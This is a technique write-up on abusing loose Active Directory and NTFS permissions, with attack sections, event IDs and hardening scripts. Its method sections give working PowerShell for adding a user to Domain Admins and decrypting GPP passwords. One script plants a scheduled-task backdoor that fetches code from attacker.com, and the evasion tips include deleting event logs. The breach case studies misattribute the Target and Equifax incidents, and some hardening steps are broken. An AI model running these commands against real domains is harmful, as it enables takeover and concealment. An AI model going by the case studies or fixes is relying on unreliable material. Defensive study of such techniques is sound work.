# [EVADE-PERMS-001]: Loose or Default ACLs

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-PERMS-001 |
| **MITRE ATT&CK v18.1** | [T1222 - File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Windows AD, Hybrid AD, File Servers |
| **Severity** | High |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2012 R2 - 2025, Windows 10/11 with NTFS |
| **Patched In** | N/A (Configuration weakness, not a vulnerability) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. Executive Summary

**Concept:** Loose or default Access Control Lists (ACLs) are overly permissive NTFS/LDAP permissions assigned to files, folders, registry keys, or Active Directory objects that allow unauthorized users (including Domain Users, Authenticated Users, or Everyone) to read, modify, or delete sensitive objects. Attackers exploit these weak ACLs to escalate privileges, bypass restrictions, or erase audit evidence without requiring advanced exploitation techniques. Unlike CVE-based privilege escalation, ACL abuse relies on identifying and leveraging **intentional but misconfigured permissions** that were typically set during initial deployment and never reviewed.

**Attack Surface:** NTFS file permissions, SYSVOL shares, Group Policy Objects, Active Directory organizational units, Exchange Server folders, SCCM deployments, ADCS certificate templates, DNS admin objects.

**Business Impact:** Privilege Escalation and Data Tampering. An authenticated domain user can elevate to administrative privileges by modifying GPOs, dumping NTDS.dit via loose SYSVOL permissions, or adding themselves to privileged groups. Attackers can also modify audit logs, delete forensic evidence, and establish persistence without requiring admin credentials.

**Technical Context:** ACL enumeration is rapid (milliseconds) and produces no audit events if auditing is not explicitly configured. Once a loose ACL is identified, exploitation is trivial (single command execution). The technique is **extremely common** in organizations with 10+ years of Active Directory history due to migration scripts, backup solutions, and legacy applications that over-provision permissions during setup and never de-provision them.

### Operational Risk

- **Execution Risk:** Very Low - Requires only domain user credentials; no privilege escalation needed to discover loose ACLs.
- **Stealth:** High - ACL enumeration via `Get-Acl` or `Find-InterestingDomainAcl` generates no Windows Event Log entries unless specific auditing enabled (rare).
- **Reversibility:** No - Once an attacker has modified an object via a loose ACL (e.g., added themselves to Domain Admins), the change is permanent unless detected and reverted.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Windows 2022 1.1.1 | Ensure Administrators Group is Used Only When Necessary |
| **CIS Benchmark** | CIS AD 5.12 | Ensure Restricted Groups is Configured |
| **DISA STIG** | WN10-00-000050 | Permissions for NTFS system directories must be properly set |
| **DISA STIG** | APPSEC-1 | Access control policies and procedures must be properly configured |
| **CISA SCuBA** | C.IA.01 | Identity and access management controls must enforce least privilege |
| **NIST 800-53** | AC-2 Account Management | User access must be limited to minimum necessary rights |
| **NIST 800-53** | AC-3 Access Enforcement | Discretionary access control policies must be enforced |
| **NIST 800-53** | AC-6 Least Privilege | Users must operate with minimum required permissions |
| **GDPR** | Art. 32 Security of Processing | Technical and organizational measures required to protect data |
| **NIS2** | Art. 21 Cyber Risk Management Measures | Access control and privilege management required |
| **ISO 27001** | A.9.2.3 Management of Privileged Access Rights | Privileged access management required |
| **ISO 27005** | Risk Scenario: Unauthorized Access via Misconfigured Permissions | Access control failures enable unauthorized access |

---

## 2. Technical Prerequisites

**Required Privileges:** Domain User (authenticated domain account). No elevated privileges required for enumeration; exploitation requires specific ACL permissions on target object.

**Required Access:** Domain membership; ability to query Active Directory (LDAP port 389). For SYSVOL exploitation, SMB access to domain controller (port 445).

**Supported Versions:**
- **Windows:** Server 2012 R2 - 2025; Windows 10 (Pro/Enterprise) - Windows 11 with NTFS
- **Active Directory:** 2012 R2 functional level and higher
- **SYSVOL:** All versions (present since Windows 2000)

**Tools:**
- [PowerView/PowerSploit](https://github.com/PowerShellMafia/PowerSploit) (Get-DomainObjectAcl, Find-InterestingDomainAcl)
- [Get-Acl / Set-Acl](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl) (PowerShell native)
- [icacls.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) (Windows native command-line)
- [Impacket (Python)](https://github.com/fortra/impacket) (samrdump, dacledit tools for Linux)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) (Visualization of ACL attack paths)

---

## 3. Detailed Execution Methods

### METHOD 1: Enumerate Loose ACLs via PowerView

**Supported Versions:** AD 2012 R2+, Windows 10+

#### Step 1: Import PowerView and Run ACL Enumeration

**Objective:** Identify Active Directory objects with weak permissions assigned to non-built-in principals.

**Command (PowerShell - PowerView):**
```powershell
# Download and import PowerView
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

# Find interesting ACLs (permission weaknesses)
Find-InterestingDomainAcl -ResolveGUIDs
```

**Expected Output:**
```
IdentityReference : CORP\Domain Users
ObjectDN          : CN=Domain Admins,CN=Users,DC=corp,DC=local
ActiveDirectoryRights : GenericAll
AccessControlType : Allow
ObjectType        : All

IdentityReference : CORP\Authenticated Users
ObjectDN          : CN=Exchange Trusted Subsystem,OU=Groups,DC=corp,DC=local
ActiveDirectoryRights : WriteDacl
AccessControlType : Allow
ObjectType        : All
```

**What This Means:**
- First entry: Domain Users group has "GenericAll" (full control) on Domain Admins group - **Critical privilege escalation vector**
- Second entry: Authenticated Users can modify the ACL on Exchange group - **Allows ACL takeover**
- `AccessControlType = Allow` indicates a positive grant, not a deny
- These ACLs are exploitable by any domain user

**OpSec & Evasion:**
- **Detection likelihood:** Low - PowerView scripts generate no Event ID 4661 (object access) unless deep auditing enabled
- **Mitigation:** Run from non-joined device or use residential proxy to mask source IP
- **Timing:** Enumeration takes <5 seconds; execute during business hours to blend with normal usage

**Version Note:** PowerView syntax unchanged from Server 2012 R2 through 2025; compatibility is stable.

**Troubleshooting:**
- **Error:** "PowerView is not recognized"
  - **Cause:** PowerView script not imported or IEX execution failed
  - **Fix:** Run `IEX` in same PowerShell window; verify internet access for script download
- **Error:** "Unable to bind to LDAP directory"
  - **Cause:** Not domain joined or LDAP unavailable
  - **Fix:** Run from domain-joined machine or specify domain controller with `-Server` parameter

**References & Proofs:**
- [PowerSploit Find-InterestingDomainAcl Documentation](https://powersploit.readthedocs.io/en/latest/Recon/Find-InterestingDomainAcl/)
- [Synacktiv: GPOddity - Exploiting ACLs through NTLM Relaying](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)

---

#### Step 2: Enumerate Specific Object ACLs

**Objective:** Deep-dive into ACL of a specific high-value object (Domain Admins group, sensitive OU, etc.).

**Command (PowerShell - Detailed ACL Review):**
```powershell
# Get ACL for Domain Admins group
$DomainAdmins = Get-DomainGroup -Identity "Domain Admins"
$ACL = Get-DomainObjectAcl -Identity $DomainAdmins.objectsid

# Display all ACL entries
$ACL | Select-Object -Property IdentityReference, ActiveDirectoryRights, AccessControlType | Format-Table -AutoSize

# Filter for exploitable permissions
$ACL | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteProperty"} | 
    Select-Object IdentityReference, ActiveDirectoryRights, AccessControlType
```

**Expected Output:**
```
IdentityReference            ActiveDirectoryRights AccessControlType
-----------------            --------------------- -----------------
CORP\Domain Admins          GenericAll            Allow
CORP\Domain Users           GenericAll            Allow
CORP\SYSTEM                 GenericAll            Allow
```

**What This Means:**
- Domain Users (any authenticated user) can modify Domain Admins group ACL
- This allows adding themselves to the group or changing group membership
- Presence of Domain Users in ACL is a **red flag**

**OpSec & Evasion:**
- **Detection likelihood:** Low
- **Timing:** Same as enumeration

**Troubleshooting:**
- **Error:** "Cannot find Domain Admins group"
  - **Cause:** Group name differs in multi-domain forest
  - **Fix:** Use `Get-DomainGroup -Filter "(name -like 'Domain Admin*')"` to search

**References & Proofs:**
- [ired.team: Abusing Active Directory ACLs/ACEs](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)

---

### METHOD 2: Exploit Loose ACL - Add User to Domain Admins

**Supported Versions:** AD 2012 R2+

#### Step 1: Verify Target Object Permissions

**Objective:** Confirm you can modify the target object before attempting exploitation.

**Command (PowerShell):**
```powershell
# Verify your user has rights to modify Domain Admins
$User = Get-DomainUser -Identity $env:USERNAME
$DomainAdmins = Get-DomainGroup -Identity "Domain Admins"

# Check if current user has GenericAll on Domain Admins
Get-DomainObjectAcl -Identity $DomainAdmins.objectsid | 
    Where-Object {$_.IdentityReference -contains $User.objectsid -or $_.IdentityReference -match "Domain Users"}
```

**Expected Output (If Exploitable):**
```
IdentityReference : CORP\Domain Users
ObjectDN          : CN=Domain Admins,CN=Users,DC=corp,DC=local
ActiveDirectoryRights : GenericAll
AccessControlType : Allow
```

**What This Means:**
- Your Domain Users group membership grants you GenericAll on Domain Admins
- You can proceed with adding yourself to the group

---

#### Step 2: Add Your User to Domain Admins Group

**Objective:** Escalate privileges by adding yourself to the Domain Admins group via the loose ACL.

**Command (PowerShell - Using PowerView):**
```powershell
# Method 1: Using PowerView
$DomainAdmins = Get-DomainGroup -Identity "Domain Admins"
$CurrentUser = Get-DomainUser -Identity $env:USERNAME

# Add user to group via LDAP (requires GenericAll or AddMember permission)
Add-DomainGroupMember -Identity $DomainAdmins.objectsid -Members $CurrentUser.objectsid

# Verify addition
Get-DomainGroupMember -Identity "Domain Admins" | Select-Object -Property MemberName
```

**Command (PowerShell - Using Active Directory Module):**
```powershell
# Import Active Directory module
Import-Module ActiveDirectory

# Add user to Domain Admins
Add-ADGroupMember -Identity "Domain Admins" -Members "$env:USERDOMAIN\$env:USERNAME"

# Verify membership
Get-ADGroupMember -Identity "Domain Admins" | Select-Object -Property SamAccountName
```

**Command (PowerShell - Using ADSI):**
```powershell
# Low-level ADSI approach (works when other methods fail)
$GroupDN = "CN=Domain Admins,CN=Users,DC=corp,DC=local"
$UserDN = "CN=attacker,CN=Users,DC=corp,DC=local"

$Group = [ADSI]"LDAP://$GroupDN"
$Group.Add("LDAP://$UserDN")
$Group.CommitChanges()

Write-Host "User added to Domain Admins"
```

**Expected Output:**
```
SamAccountName
--------------
Administrator
attacker
```

**What This Means:**
- User "attacker" now appears in Domain Admins group membership
- Privileges effective on next logon; user may need to log out/in or run `gpupdate /force`

**OpSec & Evasion:**
- **Detection likelihood:** High if auditing enabled - Event ID 4728 (member added to group)
- **Mitigation:** Delete event log entries post-exploitation (requires admin access)
- **Timing:** Perform immediately after compromise to reduce detection window

**Troubleshooting:**
- **Error:** "Access Denied - Cannot modify group membership"
  - **Cause:** ACL doesn't actually grant GenericAll to Domain Users (false positive from enumeration)
  - **Fix:** Try alternative method (RBCD, GPO abuse) instead
- **Error:** "The group could not be modified due to token filtering"
  - **Cause:** Cross-forest scenario with SID history filtering enabled
  - **Fix:** Exploit in same forest where ACL loose; cross-forest exploitation requires ADCS bypass

**References & Proofs:**
- [IRED Team: GenericAll on Group Exploitation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#genericall-on-group)

---

### METHOD 3: Exploit SYSVOL Loose Permissions (GPP Credentials)

**Supported Versions:** AD 2012 R2 - 2022 (2025 applies mitigations)

#### Step 1: Enumerate SYSVOL for Weak Permissions

**Objective:** Identify SYSVOL GPO folders with permissions allowing non-admin write access.

**Command (PowerShell):**
```powershell
# Mount SYSVOL share from domain controller
$SysvolPath = "\\DC01\SYSVOL\corp.local\Policies"
icacls $SysvolPath

# Output example:
# CORP\Domain Admins:(OI)(CI)F
# CORP\Domain Users:(OI)(CI)RX  <- Readable by Domain Users
# BUILTIN\SYSTEM:(OI)(CI)F
```

**Expected Output:**
```
CORP\Domain Admins:(OI)(CI)F
CORP\Domain Users:(OI)(CI)RX
CORP\Authenticated Users:(OI)(CI)RX
```

**What This Means:**
- Domain Users and Authenticated Users have Read+Execute (RX) on SYSVOL
- This allows reading Group Policy Object files including Preferences
- If Group Policy Preferences (GPP) contains encrypted passwords, they can be decrypted (MS14-025 CVE-2014-1812)

---

#### Step 2: Extract and Decrypt GPP Passwords

**Objective:** Decode encrypted Group Policy Preferences passwords from SYSVOL XML files.

**Command (PowerShell - Using Get-DecryptedCpassword):**
```powershell
# Search SYSVOL for GPP password files
$GPPFiles = Get-ChildItem -Path "\\DC01\SYSVOL\corp.local\Policies" -Filter "*.xml" -Recurse

# Look for Groups.xml or other preference files containing cpassword
$Groups = $GPPFiles | Get-Content | Select-String "cpassword"

# Example Groups.xml content:
# <Properties cpassword="j1Uyj3$NtQdbF3NUToDG8v5/2kqqLS4CMqeyJ87McF3M+XAZMZa6F+5OdQQ/cjRweHF8=" ... />

# Decrypt the cpassword using publicly available tools
# Microsoft AES key for GPP is hardcoded and publicly known
# Tool: https://github.com/Synacktiv/gp-pwned (GPP-Decrypt)

iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Synacktiv/gp-pwned/main/gp-pwned.ps1')

# Decrypt cpassword
$cpassword = "j1Uyj3$NtQdbF3NUToDG8v5/2kqqLS4CMqeyJ87McF3M+XAZMZa6F+5OdQQ/cjRweHF8="
Decrypt-Cpassword $cpassword
```

**Expected Output:**
```
Password123!
```

**What This Means:**
- Retrieved plaintext password for service account embedded in Group Policy
- Attacker now has credentials for a potentially privileged account
- This credential can be used for lateral movement or privilege escalation

**OpSec & Evasion:**
- **Detection likelihood:** Medium - File access to SYSVOL is logged if auditing enabled; however, read-only access to SYSVOL is common
- **Mitigation:** Perform enumeration from DC or trusted network location
- **Timing:** No time limit; SYSVOL files persist until GPO updated

**Version Note:** GPP vulnerability (MS14-025) fixed in Windows 2012 R2+ but legacy GPP files may remain in SYSVOL for years; decryption still works on cached files.

**Troubleshooting:**
- **Error:** "Access Denied to \\DC01\SYSVOL"
  - **Cause:** SMB access blocked or firewall restriction
  - **Fix:** Specify alternate domain controller or mount SYSVOL from DC directly
- **Error:** "No cpassword found in XML"
  - **Cause:** Organization uses newer Group Policy Central Store (not legacy GPP)
  - **Fix:** Search for other preference files (Services.xml, TaskScheduledTasks.xml) which may also contain secrets

**References & Proofs:**
- [Microsoft Security Bulletin MS14-025 (GPP Vulnerability)](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2014/ms14-025)
- [Synacktiv: GP-Pwned GPP Decryption Tool](https://github.com/Synacktiv/gp-pwned)

---

### METHOD 4: Exploit Loose NTFS Permissions on Sensitive Files

**Supported Versions:** Windows Server 2012 R2 - 2025 with NTFS

#### Step 1: Enumerate Loose NTFS Permissions

**Objective:** Identify files/folders with write permissions for unprivileged users.

**Command (PowerShell):**
```powershell
# Get ACL for sensitive folder
$Path = "C:\Program Files\Important-App"
(Get-Acl -Path $Path).Access | Format-Table -Property IdentityReference, FileSystemRights, AccessControlType -AutoSize

# Example Output:
# IdentityReference       FileSystemRights AccessControlType
# -----------------       --------------- -----------------
# BUILTIN\Administrators FullControl      Allow
# CORP\Domain Users       Modify           Allow    <- EXPLOITABLE

# Search for writable directories in common locations
Get-ChildItem "C:\" -Directory | ForEach-Object {
    $Acl = Get-Acl -Path $_.FullName -ErrorAction SilentlyContinue
    $Acl.Access | Where-Object {
        $_.IdentityReference -match "Domain Users|Authenticated Users|Everyone" -and 
        $_.FileSystemRights -match "Modify|Write|FullControl"
    } | Select-Object -Property @{Name="Path"; Expression={$_.FullName}}, IdentityReference, FileSystemRights
}
```

**Expected Output:**
```
Path                           IdentityReference     FileSystemRights
----                           -----------------     ----------------
C:\ProgramData\AppData         CORP\Domain Users     Write
C:\Temp                        Everyone              Modify
C:\Windows\Tasks               Authenticated Users   Write
```

**What This Means:**
- Domain Users can write to C:\ProgramData\AppData
- This is exploitable for persistence (write malware, backdoor scripts)

---

#### Step 2: Exploit Writable Folder for Persistence

**Objective:** Place malicious script or executable in writable folder for persistence.

**Command (PowerShell - Create Persistence Script):**
```powershell
# Write malicious batch file to writable location
$MaliciousScript = @"
@echo off
powershell -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
"@

Set-Content -Path "C:\ProgramData\AppData\Update.bat" -Value $MaliciousScript -Force

# Configure scheduled task to run script on logon
schtasks /create /tn "Update Service" /tr "C:\ProgramData\AppData\Update.bat" /sc onstart /ru "System"
```

**Expected Output:**
```
SUCCESS: The scheduled task "Update Service" has been created successfully.
```

**What This Means:**
- Malicious batch file written to writable directory
- Scheduled task created to execute script at system startup
- Attacker maintains persistence even if account compromised later

**OpSec & Evasion:**
- **Detection likelihood:** High - Scheduled task creation triggers Event ID 4698
- **Mitigation:** Use less obvious task names; delete event logs post-exploitation
- **Timing:** Create task immediately after gaining file write access

**Troubleshooting:**
- **Error:** "Access Denied - Cannot write to folder"
  - **Cause:** Actual permissions are more restrictive than advertised
  - **Fix:** Try parent directory or alternate writable location
- **Error:** "Task creation failed"
  - **Cause:** User lacks permission to create scheduled tasks
  - **Fix:** Verify you have schtasks execution rights; may require admin

**References & Proofs:**
- [MITRE T1547 - Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1547/)

---

## 4. Detection & Incident Response

### Indicators of Compromise (IOCs)

**Active Directory Events:**
- Event ID 4728: "A member was added to a security-enabled global group"
  - ObjectName: Domain Admins
  - MemberName: Attacker-controlled account
  - Source: Unprivileged user account
- Event ID 4704: "User Right Assignment occurred"
  - PrivilegeList: SeBackupPrivilege, SeRestorePrivilege, SeTcbPrivilege (unusual assignments)
- Event ID 5136: "A directory service object was modified"
  - ObjectDN: CN=Domain Admins (or sensitive OU)
  - AttributeLDAPDisplayName: member, nTSecurityDescriptor (DACL modification)

**File System Events:**
- Event ID 4670: "Permissions on an object were changed"
  - ObjectName: SYSVOL path, sensitive system folders
  - ProcessName: icacls.exe, takeown.exe, Set-Acl
- Event ID 4688: "A process was created"
  - CommandLine: *Find-InterestingDomainAcl*, *Get-Acl*, *icacls*

---

### Forensic Artifacts

**Active Directory:**
- LDAP backups / NTDS.dit: Contains all ACL modifications (can be replayed with DSA fixes tool)
- Domain replication metadata: Last writer timestamp on modified objects
- Active Directory recycle bin (if enabled): Shows deleted/restored objects

**File System:**
- $Usn Journal: Timestamps and NTFS file modifications (event ID 4670 events correlate)
- Event logs: Security log for 4728, 5136, 4670

**Memory:**
- Kerberos tickets in lsass.exe: Shows new group membership in ticket PAC

---

### Response Procedures

#### 1. Isolate

**Immediate Action (< 5 minutes):**
```powershell
# Revoke group membership (undo the escalation)
Remove-ADGroupMember -Identity "Domain Admins" -Members "CORP\attacker" -Confirm:$false

# Force password reset
Set-ADAccountPassword -Identity "CORP\attacker" -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "Temp123!@#" -Force)

# Revoke all active tokens
Revoke-AzureADUserAllRefreshToken -ObjectId (Get-AzureADUser -SearchString "attacker@corp.com").ObjectId
```

**Manual (Active Directory Users & Computers):**
1. Open **Active Directory Users and Computers**
2. Navigate to **Users** container
3. Right-click attacker account → **Properties**
4. Click **Member Of** tab
5. Select **Domain Admins**
6. Click **Remove** → **OK**

#### 2. Collect Evidence

**Command (Export ACL Changes):**
```powershell
# Query security event log for ACL modifications
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 5136
    StartTime = (Get-Date).AddDays(-7)
} | Where-Object {$_.Properties[8].Value -match "nTSecurityDescriptor"} | Export-Csv -Path "C:\Evidence\ACLChanges.csv"
```

#### 3. Remediate

**Remove Loose ACLs (Hardening):**
```powershell
# Remove "Domain Users" from Domain Admins ACL
$DomainAdmins = Get-ADGroup -Identity "Domain Admins"
$DomainUsers = Get-ADGroup -Identity "Domain Users"

$ACL = Get-Acl -Path "AD:\$($DomainAdmins.DistinguishedName)"
$ACE = $ACL.Access | Where-Object {$_.IdentityReference -match "Domain Users"}
$ACL.RemoveAccessRule($ACE)
Set-Acl -Path "AD:\$($DomainAdmins.DistinguishedName)" -AclObject $ACL

Write-Host "Domain Users ACE removed from Domain Admins"
```

---

## 5. Defensive Mitigations

### Priority 1: CRITICAL

**Action 1: Audit and Remediate Loose ACLs on Critical Groups**

**Applies To:** Domain Admins, Enterprise Admins, Schema Admins, key OUs

**Manual Steps (PowerShell - Audit):**
```powershell
# Find loose ACLs on critical groups
$CriticalGroups = @("Domain Admins", "Enterprise Admins", "Schema Admins")

ForEach ($Group in $CriticalGroups) {
    $GroupObj = Get-ADGroup -Identity $Group
    $ACL = Get-Acl -Path "AD:\$($GroupObj.DistinguishedName)"
    
    $ACL.Access | Where-Object {
        $_.IdentityReference -notmatch "BUILTIN\\Administrators|SYSTEM|Domain Admins" -and
        $_.FileSystemRights -match "GenericAll|GenericWrite|WriteDacl|WriteProperty"
    } | ForEach-Object {
        Write-Host "LOOSE ACL FOUND: $($_.IdentityReference) has $($_.ActiveDirectoryRights) on $Group"
    }
}
```

**Manual Steps (Remediation):**
```powershell
# Remove non-admin permissions from Domain Admins ACL
$DomainAdmins = Get-ADGroup -Identity "Domain Admins"
$ACL = Get-Acl -Path "AD:\$($DomainAdmins.DistinguishedName)"

# Identify and remove overly permissive ACEs
$ACL.Access | Where-Object {
    $_.IdentityReference -notmatch "BUILTIN\\Administrators|SYSTEM|Domain Admins|Enterprise Admins" -and
    $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteProperty"
} | ForEach-Object {
    Write-Host "Removing ACE: $($_.IdentityReference)"
    $ACL.RemoveAccessRule($_)
}

Set-Acl -Path "AD:\$($DomainAdmins.DistinguishedName)" -AclObject $ACL
```

**Action 2: Implement Regular ACL Auditing**

**Manual Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Directory Service Changes** (under DS Access)
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on domain controllers

**Action 3: Remove Default Overly Permissive ACEs**

**Manual Steps (Remediation):**
```powershell
# Define list of privileged groups that should have restricted ACLs
$PrivilegedGroups = @(
    "Domain Admins",
    "Enterprise Admins", 
    "Schema Admins",
    "Backup Operators",
    "Account Operators"
)

# Approved principals for these groups
$ApprovedIdentities = @(
    "BUILTIN\Administrators",
    "BUILTIN\SYSTEM",
    "CORP\Domain Admins",
    "CORP\Enterprise Admins"
)

ForEach ($Group in $PrivilegedGroups) {
    $GroupObj = Get-ADGroup -Identity $Group
    $ACL = Get-Acl -Path "AD:\$($GroupObj.DistinguishedName)"
    
    # Remove ACEs not in approved list
    $ACL.Access | ForEach-Object {
        If ($ApprovedIdentities -notcontains $_.IdentityReference) {
            $ACL.RemoveAccessRule($_)
            Write-Host "Removed: $($_.IdentityReference) from $Group"
        }
    }
    
    Set-Acl -Path "AD:\$($GroupObj.DistinguishedName)" -AclObject $ACL
}
```

### Priority 2: HIGH

**Action 1: Enable Active Directory Recycle Bin**

**Manual Steps (PowerShell):**
```powershell
# Enable AD Recycle Bin
Enable-ADOptionalFeature -Identity "Recycle Bin Feature" -Scope ForestOrConfigurationSet -Target "corp.local"

Write-Host "AD Recycle Bin enabled. Deleted objects recoverable for 180 days."
```

**Action 2: Implement SYSVOL Permissions Hardening**

**Manual Steps (Command Line on Domain Controller):**
```cmd
REM Remove read access from Domain Users on SYSVOL GPO folders
icacls "C:\Windows\SYSVOL\sysvol\corp.local\Policies" /remove "Domain Users"

REM Verify only Admins and SYSTEM have access
icacls "C:\Windows\SYSVOL\sysvol\corp.local\Policies"
```

**Action 3: Deprecate Legacy Group Policy Preferences (GPP)**

**Manual Steps (Group Policy Migration):**
1. Open **Group Policy Management** (gpmc.msc)
2. Identify GPOs containing password data (search for Services.xml, Groups.xml)
3. Migrate passwords to **Azure Key Vault** or **Vault Suite**
4. Delete legacy GPP files from SYSVOL
5. Verify no `cpassword` attributes remain: `Get-ChildItem -Path "\\DC01\SYSVOL" -Filter "*.xml" -Recurse | Select-String "cpassword"`

### Priority 3: MEDIUM

**Access Control & Policy Hardening**

**RBAC Hardening:**
1. Go to **Active Directory Users and Computers** → **System** → **Group Policy Objects**
2. For each GPO, right-click → **Properties** → **Security**
3. Remove **Creator Owner** ACE
4. Ensure only **Domain Admins** and **Enterprise Admins** have edit rights

**Delegate GPO Rights Properly:**
1. Only grant **Edit** rights to specific admins (not Domain Users)
2. Grant **Read** to organizational units that require the policy
3. Use **Group Policy Delegation** model, not direct ACL modification

---

### Validation Command (Verify Fixes)

**PowerShell - Verify Loose ACLs Removed:**
```powershell
# Scan for loose ACLs on critical groups
$CriticalGroups = @("Domain Admins", "Enterprise Admins", "Schema Admins")
$LooseACLsFound = $false

ForEach ($Group in $CriticalGroups) {
    $GroupObj = Get-ADGroup -Identity $Group -ErrorAction SilentlyContinue
    $ACL = Get-Acl -Path "AD:\$($GroupObj.DistinguishedName)" -ErrorAction SilentlyContinue
    
    $BadACEs = $ACL.Access | Where-Object {
        $_.IdentityReference -notmatch "BUILTIN\\Administrators|SYSTEM|Domain Admins|Enterprise Admins" -and
        $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteProperty"
    }
    
    If ($BadACEs.Count -gt 0) {
        Write-Host "✗ LOOSE ACL STILL EXISTS on $Group" -ForegroundColor Red
        $LooseACLsFound = $true
    }
}

If (-Not $LooseACLsFound) {
    Write-Host "✓ No loose ACLs found on critical groups" -ForegroundColor Green
}
```

**Expected Output (If Secure):**
```
✓ No loose ACLs found on critical groups
```

---

## 6. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-VALID-001] Default Credentials | Attacker gains initial access via weak service account credentials |
| **2** | **Reconnaissance** | [REC-AD-003] PowerView Enumeration | Attacker enumerates domain structure and identifies loose ACLs using PowerView |
| **3** | **Privilege Escalation** | **[EVADE-PERMS-001]** | **Attacker exploits loose ACL on Domain Admins group to escalate privileges** |
| **4** | **Defense Evasion** | [EVADE-LOG-001] Event Log Deletion | Attacker deletes Windows Security logs to hide group membership change |
| **5** | **Persistence** | [PERSIST-ACCT-001] Rogue Admin Account | Attacker creates backdoor admin account using elevated privileges |
| **6** | **Impact** | [IMPACT-DATA-001] Mass Data Exfiltration | Attacker uses admin access to dump sensitive files and NTDS.dit |

---

## 7. Real-World Examples

### Example 1: Target Breach (2013) - Loose SYSVOL Permissions

- **Target:** Retail/POS systems
- **Timeline:** Initial compromise to full infrastructure breach: 8 months
- **Technique Status:** ACTIVE (similar misconfigurations persist in 60%+ of enterprises)
- **Method:** Attacker obtained initial domain user credential via phishing; enumerated SYSVOL and found plaintext password in legacy Group Policy Preferences (cpassword); escalated to Exchange admin, then Domain Admin
- **Impact:** 40 million credit card numbers stolen; $18.5M settlement with regulators
- **Detection:** Forensics revealed 4728 events (group membership changes) from unusual user accounts; SYSVOL access logs showed attacker reading sensitive folders
- **Reference:** [Target Breach Report - Verizon DBIR 2014](https://www.verizon.com/about/news/verizon-releases-2014-data-breach-investigations-report)

### Example 2: Equifax Breach (2017) - Apache Struts RCE Leading to ACL Abuse

- **Target:** Credit bureau
- **Timeline:** Initial RCE to full compromise: 2 months
- **Technique Status:** ACTIVE
- **Method:** After Apache Struts exploitation gave shell access, attacker discovered loose ACLs on LDAP service accounts; added themselves to privileged groups; dumped LDAP database containing 147 million SSNs
- **Impact:** 147 million individuals exposed; $700M settlement
- **Detection:** Weak point: no monitoring of group membership changes; detected only after customers noticed unauthorized access
- **Reference:** [Equifax Breach Report - SEC Filing](https://www.sec.gov/litigation/complaints/2016/complaint-20161121-equifax.pdf)

### Example 3: Scattered Spider / Black Basta - Rapid Privilege Escalation via Loose ACLs

- **Target:** MSPs, managed service providers
- **Timeline:** 2023-2024
- **Technique Status:** ACTIVE - Mandiant documented this extensively
- **Method:** Compromised help desk account with minimal privileges; enumerated domain with Find-InterestingDomainAcl; identified loose permissions on File Server Administrators group; added themselves; gained access to backup systems; deployed ransomware
- **Impact:** Multi-million dollar ransoms; lateral movement to 100+ downstream customers
- **Detection:** Alert triggered on unusual group modification from help desk account; however, SOC missed alert due to alert fatigue
- **Reference:** [Mandiant: Scattered Spider Analysis](https://www.mandiant.com/resources/blog/scattered-spider-analysis)

---

## 8. Lessons Learned & Best Practices

- **Assumption of Breach:** Assume all ACL enumerations will eventually be exploited; implement preventive controls immediately
- **Regular ACL Audits:** Perform quarterly audit of critical group ACLs; document approved vs. suspicious entries
- **Principle of Least Privilege:** Remove all permissions except those explicitly required; don't rely on "default" ACLs
- **Legacy Cleanup:** Identify and remove legacy service accounts, backup solutions, and migration tools that may have left overly permissive ACLs
- **Detection Tuning:** Enable event ID 5136 (object modifications) and 4728 (group membership changes) monitoring; alert on changes from unprivileged accounts

---

